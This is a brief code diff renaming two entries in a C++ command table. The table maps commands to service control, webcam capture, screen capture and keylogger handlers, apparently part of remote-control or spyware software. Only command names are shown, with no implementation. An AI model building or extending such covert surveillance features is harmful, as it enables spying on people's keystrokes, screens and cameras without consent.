@@ -12,8 +12,8 @@ namespace Services {
         {"service-list",        &listServices},
         {"service-start",       &startService},
         {"service-stop",        &stopService},
-        {"webcam-start",        &webcamCapture},
-        {"screenshot",          &screenShot},
+        {"webcam-record",       &webcamCapture},
+        {"screen-capture",      &screenShot},
         {"keylogger",           &keyLogger}
     };
 };
